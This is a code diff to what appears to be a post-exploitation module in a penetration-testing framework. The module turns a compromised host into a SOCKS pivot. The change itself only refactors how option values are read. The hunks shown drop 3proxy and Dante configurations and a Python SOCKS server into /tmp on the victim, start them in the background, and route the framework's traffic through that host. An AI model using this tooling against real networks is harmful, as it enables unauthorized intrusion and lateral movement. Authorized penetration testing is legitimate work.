@@ -22,8 +22,8 @@ class Module(Post, System):
         """Create SOCKS proxy through the session"""
         
         print_status("Setting up SOCKS proxy...")
-        print_info(f"Type: {self.proxy_type.value}")
-        print_info(f"Port: {self.proxy_port.value}")
+        print_info(f"Type: {self.proxy_type}")
+        print_info(f"Port: {self.proxy_port}")
         print_info("All traffic through this proxy will be routed through the compromised machine")
         
         # Check available tools
@@ -91,17 +91,17 @@ timeouts 1 5 30 60 180 1800 15 60
 daemon
 maxconn 200
 nolog
-socks -p{self.proxy_port.value}
+socks -p{self.proxy_port}
 """
             
-            config_file = f"/tmp/3proxy_{self.proxy_port.value}.cfg"
+            config_file = f"/tmp/3proxy_{self.proxy_port}.cfg"
             
             # Write config
             write_cmd = f"cat > {config_file} << 'EOF3PROXY'\n{config_content}\nEOF3PROXY"
             self.cmd_exec(write_cmd)
             
             # Start 3proxy
-            if self.background.value:
+            if self.background:
                 start_cmd = f"3proxy {config_file} &"
             else:
                 start_cmd = f"3proxy {config_file}"
@@ -112,8 +112,8 @@ socks -p{self.proxy_port.value}
             # Check if running
             check = self.cmd_exec(f"ps aux | grep -v grep | grep '3proxy.*{config_file}'")
             if check and check.strip():
-                print_success(f"3proxy SOCKS proxy started on port {self.proxy_port.value}!")
-                print_info(f"Configure your tools to use: {self.proxy_port.value} as SOCKS proxy")
+                print_success(f"3proxy SOCKS proxy started on port {self.proxy_port}!")
+                print_info(f"Configure your tools to use: {self.proxy_port} as SOCKS proxy")
                 
                 # Auto-configure framework proxy
                 self._configure_framework_proxy()
@@ -136,7 +136,7 @@ socks -p{self.proxy_port.value}
             # Check if we can use danted with minimal config
             config_content = f"""
 logoutput: stderr
-internal: 0.0.0.0 port = {self.proxy_port.value}
+internal: 0.0.0.0 port = {self.proxy_port}
 external: eth0
 socksmethod: username none
 clientmethod: none
@@ -154,12 +154,12 @@ socks pass {{
 }}
 """
             
-            config_file = f"/tmp/dante_{self.proxy_port.value}.conf"
+            config_file = f"/tmp/dante_{self.proxy_port}.conf"
             
             write_cmd = f"cat > {config_file} << 'EOFDANTE'\n{config_content}\nEOFDANTE"
             self.cmd_exec(write_cmd)
             
-            if self.background.value:
+            if self.background:
                 start_cmd = f"sockd -f {config_file} &"
             else:
                 start_cmd = f"sockd -f {config_file}"
@@ -169,7 +169,7 @@ socks pass {{
             
             check = self.cmd_exec(f"ps aux | grep -v grep | grep 'sockd.*{config_file}'")
             if check and check.strip():
-                print_success(f"Dante SOCKS proxy started on port {self.proxy_port.value}!")
+                print_success(f"Dante SOCKS proxy started on port {self.proxy_port}!")
                 
                 # Auto-configure framework proxy
                 self._configure_framework_proxy()
@@ -310,21 +310,21 @@ def handle_socks_connection(client_sock):
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-server.bind(('0.0.0.0', {self.proxy_port.value}))
+server.bind(('0.0.0.0', {self.proxy_port}))
 server.listen(10)
 
-print(f"SOCKS proxy listening on 0.0.0.0:{self.proxy_port.value}")
+print(f"SOCKS proxy listening on 0.0.0.0:{self.proxy_port}")
 
 while True:
     client, addr = server.accept()
     threading.Thread(target=handle_socks_connection, args=(client,)).start()
 """
             
-            script_path = f"/tmp/socks_{self.proxy_port.value}.py"
+            script_path = f"/tmp/socks_{self.proxy_port}.py"
             write_cmd = f"cat > {script_path} << 'EOFSOCKS'\n{python_script}\nEOFSOCKS"
             self.cmd_exec(write_cmd)
             
-            if self.background.value:
+            if self.background:
                 run_cmd = f"python3 {script_path} &"
             else:
                 run_cmd = f"python3 {script_path}"
@@ -334,9 +334,9 @@ while True:
             
             check = self.cmd_exec(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
             if check and check.strip():
-                print_success(f"Python SOCKS proxy started on port {self.proxy_port.value}!")
+                print_success(f"Python SOCKS proxy started on port {self.proxy_port}!")
                 print_info(f"Script: {script_path}")
-                print_info(f"Configure tools to use: {self.proxy_port.value} as SOCKS{self.proxy_type.value} proxy")
+                print_info(f"Configure tools to use: {self.proxy_port} as SOCKS{self.proxy_type} proxy")
                 
                 # Auto-configure framework proxy
                 self._configure_framework_proxy()
@@ -358,13 +358,13 @@ while True:
         """Configure framework proxy settings to use the SOCKS proxy"""
         try:
             if self.framework:
-                proxy_url = f"socks5://127.0.0.1:{self.proxy_port.value}"
+                proxy_url = f"socks5://127.0.0.1:{self.proxy_port}"
                 
                 # Configure framework proxy
                 self.framework.configure_proxy(
                     enabled=True,
                     host='127.0.0.1',
-                    port=self.proxy_port.value,
+                    port=self.proxy_port,
                     scheme='socks5'
                 )
                 
@@ -382,9 +382,9 @@ while True:
                 print_info("Modules using Http_client, requests, FTP, or raw sockets will route through the compromised machine")
             else:
                 print_warning("Framework not available - proxy not auto-configured")
-                print_info(f"Manually configure proxy: socks5://127.0.0.1:{self.proxy_port.value}")
+                print_info(f"Manually configure proxy: socks5://127.0.0.1:{self.proxy_port}")
                 
         except Exception as e:
             print_warning(f"Could not auto-configure framework proxy: {e}")
-            print_info(f"Manually configure proxy: socks5://127.0.0.1:{self.proxy_port.value}")
+            print_info(f"Manually configure proxy: socks5://127.0.0.1:{self.proxy_port}")
 
